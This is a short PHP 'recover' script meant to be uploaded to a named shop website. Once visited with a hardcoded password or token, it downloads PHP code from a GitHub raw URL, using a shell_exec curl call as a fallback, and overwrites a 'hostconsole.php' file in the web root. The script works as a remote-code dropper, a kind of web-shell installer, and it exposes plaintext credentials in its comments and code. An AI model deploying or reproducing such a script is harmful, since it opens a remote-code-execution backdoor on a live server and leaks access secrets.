<?php
// Upload to /home/sabashop/public_html/project/recover.php and visit https://sabashopping.ir/project/recover.php?password=KhTn2268&branch=arena/hostconsole-v19
// Emergency token: a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9
$pw = $_GET['password'] ?? $_GET['token'] ?? '';
if ($pw !== 'KhTn2268' && $pw !== 'a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9') { http_response_code(403); die('Invalid password'); }
$branch = $_GET['branch'] ?? 'arena/hostconsole-v19';
$url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
$content = @file_get_contents($url);
if (!$content) {
    $content = @shell_exec('curl -sL --max-time 30 '.escapeshellarg($url).' 2>&1');
}
if (!$content || strpos($content, '<?php') !== 0) {
    die('Download failed from '.$url.' size '.strlen($content ?? ''));
}
$target = __DIR__.'/hostconsole.php';
@copy($target, $target.'.bak.'.date('Ymd-His'));
if (!@file_put_contents($target, $content)) {
    die('Write failed to '.$target);
}
if (function_exists('opcache_reset')) @opcache_reset();
echo 'Recovered '.strlen($content).' bytes to '.$target.' from branch '.$branch;
echo '<br><a href="hostconsole.php?api=public.monitor&password=KhTn2268">Check monitor</a>';
